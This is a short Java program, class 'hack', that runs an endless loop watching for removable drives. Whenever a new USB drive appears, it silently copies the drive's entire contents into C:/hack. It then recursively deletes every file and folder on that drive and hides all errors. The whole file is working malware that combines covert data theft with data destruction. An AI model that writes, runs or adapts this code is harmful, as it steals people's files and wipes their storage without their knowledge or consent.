import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import javax.swing.filechooser.FileSystemView;


public class hack {
	static int noofdrives=0;
	private static void rC(File srcF, File destF) {
	     try {
	          if (srcF.isDirectory()) {
	         
	               if (!destF.exists()) {
	                    destF.mkdirs();
	               }
	 
	               
	               String[] fLs = srcF.list();
	 
	               for (int subs = 0; subs < fLs.length; subs++) {
	                    File dest = new File(destF, fLs[subs]);
	                    File source = new File(srcF, fLs[subs]);
	 
	                    
	                    rC(source, dest);
	               }
	          }
	          else {
	               
	               FileInputStream inF = new FileInputStream(srcF);
	               FileOutputStream ouF = new FileOutputStream(destF);
	 
	              
	               byte[] buffer = new byte[2048];
	               int nbr;
	 
	              
	               while ((nbr = inF.read(buffer)) >= 0) {
	                    ouF.write(buffer, 0, nbr);
	               }
	 
	              
	               if (inF != null) {
	                    inF.close();
	               }
	 
	               if (ouF != null) {
	                    ouF.close();
	               }
	          }
	     }
	     catch (Exception ex) {
	       
	     }
	}
	public static void main(String []args) throws IOException
	{
		
		String dones[] = new String[10] ;
		
		File[] paths;
		

		
		for(;;) 
		{
			try{
			FileSystemView fsv = FileSystemView.getFileSystemView();

			
			paths = File.listRoots();
		for(File path:paths)
		{
		   
		   
		    if(fsv.getSystemTypeDescription(path).equals("Removable Disk"))
		    	  {
		    	
		    	
		    	String manip = path.toString();
		    
		    	manip=manip.replace(manip.charAt(2), '/');
		    	
		    	
		    	if(checkalreadyadded(manip,dones)){
		    		
			    	dones[noofdrives]=manip;
			    	noofdrives++;
				File srcf=null; 
				srcf=new File(manip);
				File destf=null;
				destf=new File("C:/" +"hack");
				
				rC(srcf, destf);
				rD(srcf);
				 srcf.deleteOnExit();
		    	}
		    	  }
		}

		



		}
			catch(Exception e){
				
		    	noofdrives--;
				continue;
			}finally{ }
}

	}
	 public static void rD(File fl) {
	       
	        if (!fl.exists())
	            return;
	         
	        
	        if (fl.isDirectory()) {
	            for (File f : fl.listFiles()) {
	                
	                rD(f);
	            }
	        }
	       
	        fl.delete();
	       
	    }
	private static boolean checkalreadyadded(String manip, String[] dones) {
		for(int i=0;i<noofdrives;i++)
			if(manip.equals(dones[i]))
		  { return false; }
		return true;
	}
}